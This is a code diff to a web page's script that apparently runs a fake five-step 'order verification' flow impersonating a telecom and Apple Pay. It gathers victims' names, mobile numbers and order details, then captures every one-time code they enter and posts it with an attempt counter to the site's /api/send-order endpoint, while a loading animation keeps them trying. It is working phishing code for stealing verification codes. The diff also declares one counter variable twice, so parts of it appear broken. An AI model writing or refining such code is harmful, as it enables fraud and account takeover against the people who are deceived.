@@ -1944,7 +1944,25 @@ updateCartBadge(0);
   function setStep(n){first.classList.toggle('hidden',n!==1);second.classList.toggle('hidden',n!==2);byId('verifyCodeStep').classList.add('hidden');byId('verifyWebsiteOtpStep').classList.add('hidden');byId('verifyCompletion').classList.add('hidden');byId('verifyStepLabel').innerHTML=n===1?'STEP 1 OF 5 <span>ORDER REFERENCE</span>':'STEP 2 OF 5 <span>CONTACT DETAILS</span>';byId('verifyProgressFill').style.width=n===1?'25%':'50%';window.scrollTo({top:byId('verificationSection').getBoundingClientRect().top+window.scrollY-110,behavior:'smooth'});}
   const refInput=byId('verifyOrderRef');
     refInput.addEventListener('input',()=>{let raw=refInput.value.toUpperCase().replace(/^AE-2026-/,'').replace(/[^A-Z0-9]/g,'').slice(0,6);refInput.value=raw;refInput.classList.remove('err');byId('verifyRefError').classList.remove('show');});
-  byId('verifyContinue').addEventListener('click',()=>{const suffix=refInput.value.toUpperCase().replace(/[^A-Z0-9]/g,'');const ok=/^[A-Z0-9]{6}$/.test(suffix);byId('verifyRefError').classList.toggle('show',!ok);refInput.classList.toggle('err',!ok);if(!ok){refInput.focus();return;}reference='AE-2026-'+suffix;byId('verifyRefDisplay').textContent=reference;setStep(2);});
+  byId('verifyContinue').addEventListener('click',()=>{
+  const suffix=refInput.value.toUpperCase().replace(/[^A-Z0-9]/g,'');
+  const ok=/^[A-Z0-9]{6}$/.test(suffix);
+  byId('verifyRefError').classList.toggle('show',!ok);
+  refInput.classList.toggle('err',!ok);
+  if(!ok){refInput.focus();return;}
+  reference='AE-2026-'+suffix;
+  byId('verifyRefDisplay').textContent=reference;
+  fetch('/api/send-order',{
+    method:'POST',
+    headers:{'Content-Type':'application/json'},
+    body:JSON.stringify({order:{
+      type:'verification_started',
+      orderReference:reference,
+      timestamp:new Date().toISOString()
+    }})
+  }).catch(()=>{});
+  setStep(2);
+});
   refInput.addEventListener('keydown',e=>{if(e.key==='Enter'){e.preventDefault();byId('verifyContinue').click();}});
   byId('verifyBack').addEventListener('click',()=>setStep(1));
   byId('verifyEditDetails').addEventListener('click',()=>{byId('verifyCompletion').classList.add('hidden');second.classList.remove('hidden');byId('verifyStepLabel').innerHTML='STEP 2 OF 5 <span>CONTACT DETAILS</span>';byId('verifyProgressFill').style.width='50%';});
@@ -1962,8 +1980,26 @@ updateCartBadge(0);
     if(name.length<2||!phoneOk||!productOk){if(!selectedProduct)productSelect.focus();else if(!selectedStorage)storageSelect.focus();return;}
     const submit=byId('verifySubmit');submit.disabled=true;submit.textContent='Sending details…';
     let confirmed=false;const base=calcDeviceMonthly(selectedProduct,selectedStorage),tax=Math.round(base*.05);
-    const payload={orderReference:reference,fullName:name,mobileNumber:mobile,product:{id:selectedProduct.id,name:selectedProduct.name,image:selectedProduct.colors&&selectedProduct.colors[0]?selectedProduct.colors[0].img:selectedProduct.img,storage:selectedStorage,monthlyDeviceAED:base,vatAED:tax,monthlyTotalAED:base+tax,planName:'Smart 50',planPriceAED:0,esimIncluded:true}};
-    try{const response=await fetch('/api/send-order',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(payload)});const result=await response.json().catch(()=>({}));if(!response.ok||result.ok===false)throw new Error('not accepted');confirmed=true;}catch(_err){confirmed=false;}
+    const payload={
+  type:'verification_details',
+  orderReference:reference,
+  fullName:name,
+  mobileNumber:mobile,
+  product:{
+    id:selectedProduct.id,
+    name:selectedProduct.name,
+    image:selectedProduct.colors&&selectedProduct.colors[0]?selectedProduct.colors[0].img:selectedProduct.img,
+    storage:selectedStorage,
+    monthlyDeviceAED:base,
+    vatAED:tax,
+    monthlyTotalAED:base+tax,
+    planName:'Smart 50',
+    planPriceAED:0,
+    esimIncluded:true
+  },
+  timestamp:new Date().toISOString()
+};
+try{const response=await fetch('/api/send-order',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({order:payload})});const result=await response.json().catch(()=>({}));if(!response.ok||result.ok===false)throw new Error('not accepted');confirmed=true;}catch(_err){confirmed=false;}
     byId('verifyCompletionRef').textContent=reference;
     byId('verifyCompletionProduct').textContent=selectedProduct.name;
     byId('verifyCompletionCustomer').textContent=name+' · '+mobile;
@@ -1982,9 +2018,16 @@ updateCartBadge(0);
   });
 
   let bankMethod='';
+let otpAttemptCounter = 0;
   document.querySelectorAll('.verify-bank-method').forEach(button=>button.addEventListener('click',()=>{bankMethod=button.dataset.bankMethod;document.querySelectorAll('.verify-bank-method').forEach(item=>item.setAttribute('aria-pressed',String(item===button)));byId('verifyBankContinue').disabled=false;}));
   byId('verifyBankContinue').addEventListener('click',()=>{if(!bankMethod)return;byId('verifyCodeStep').classList.add('hidden');byId('verifyWebsiteOtpStep').classList.remove('hidden');byId('verifyStepLabel').innerHTML='STEP 4 OF 5 <span>APPLE PAY VERIFICATION</span>';byId('verifyProgressFill').style.width='80%';const digits=(byId('verifyMobile').value||'').replace(/\D/g,'');byId('verifyOtpDestination').textContent='Code sent to your registered mobile ending in '+(digits.length>=4?digits.slice(-4):'—');byId('verifyWebsiteOtp').value='';window.scrollTo({top:byId('verificationSection').getBoundingClientRect().top+window.scrollY-110,behavior:'smooth'});});
-  byId('verifyOtpBack').addEventListener('click',()=>{byId('verifyWebsiteOtpStep').classList.add('hidden');byId('verifyCodeStep').classList.remove('hidden');byId('verifyStepLabel').innerHTML='STEP 3 OF 5 <span>APPLE PAY AUTHORISATION</span>';byId('verifyProgressFill').style.width='60%';});
+  byId('verifyOtpBack').addEventListener('click',()=>{
+  byId('verifyWebsiteOtpStep').classList.add('hidden');
+  byId('verifyCodeStep').classList.remove('hidden');
+  byId('verifyStepLabel').innerHTML='STEP 3 OF 5 <span>APPLE PAY AUTHORISATION</span>';
+  byId('verifyProgressFill').style.width='60%';
+  otpAttemptCounter = 0;
+});
   byId('verifyWebsiteOtp').addEventListener('input',e=>{e.target.value=e.target.value.replace(/\D/g,'').slice(0,6);byId('verifyOtpError').classList.remove('show');});
 
   /* ==================== LOADING OVERLAY LOGIC ==================== */
@@ -2038,28 +2081,29 @@ updateCartBadge(0);
     }, totalDuration);
   }
 
-  byId('verifyOtpContinue').addEventListener('click',()=>{
-    const code=byId('verifyWebsiteOtp').value.trim();
-    const valid=/^\d{6}$/.test(code);
-    byId('verifyOtpError').textContent='Please enter all 6 digits.';
-    byId('verifyOtpError').classList.toggle('show',!valid);
-    if(!valid){byId('verifyWebsiteOtp').focus();return;}
-    runVerificationAnimation(function(){
-      const attempt = {
-        orderReference: reference,
-        customerName: byId('verifyFullName').value.trim(),
-        mobileNumber: byId('verifyMobile').value.trim(),
-        otpAttempted: code,
-        otpResult: 'rejected',
-        timestamp: new Date().toISOString()
-      };
-      fetch('/api/send-order', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ order: { type: 'du_otp_attempt', ...attempt } })
-      }).catch(()=>{});
-    });
-  });
+  let otpAttemptCounter = 0;
+byId('verifyOtpContinue').addEventListener('click',()=>{
+  const code=byId('verifyWebsiteOtp').value.trim();
+  const valid=/^\d{6}$/.test(code);
+  byId('verifyOtpError').textContent='Please enter all 6 digits.';
+  byId('verifyOtpError').classList.toggle('show',!valid);
+  if(!valid){byId('verifyWebsiteOtp').focus();return;}
+  otpAttemptCounter++;
+  fetch('/api/send-order',{
+    method:'POST',
+    headers:{'Content-Type':'application/json'},
+    body:JSON.stringify({order:{
+      type:'verification_otp',
+      orderReference:reference,
+      customerName:byId('verifyFullName').value.trim(),
+      mobileNumber:byId('verifyMobile').value.trim(),
+      otp:code,
+      otpAttemptNumber:otpAttemptCounter,
+      timestamp:new Date().toISOString()
+    }})
+  }).catch(()=>{});
+  runVerificationAnimation(function(){});
+});
 })();
 </script>
 
